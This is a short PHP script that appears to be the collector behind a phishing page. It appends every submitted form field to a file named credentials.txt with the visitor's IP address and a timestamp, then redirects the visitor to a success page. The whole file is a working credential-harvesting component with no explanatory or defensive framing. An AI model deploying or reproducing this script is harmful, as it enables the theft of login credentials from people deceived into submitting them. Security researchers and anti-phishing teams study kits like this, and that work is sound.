<?php

    header ('Location: success.php');
    $file = fopen("credentials.txt", "a");
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date("Y-d-m H:i:s");

    foreach($_POST as $variable => $value) {
        fwrite($file, $variable);
        fwrite($file, "=");
        fwrite($file, $value);
        fwrite($file, "\r\n"); 
    }

    fwrite($file, "IP=");
    fwrite($file, $ip);

    fwrite($file, "\r\n");

    fwrite($file, "Date=");
    fwrite($file, $date);

    fwrite($file, "\r\n");    

    fwrite($file, "\r\n");
    fclose($file);
    exit;

?>
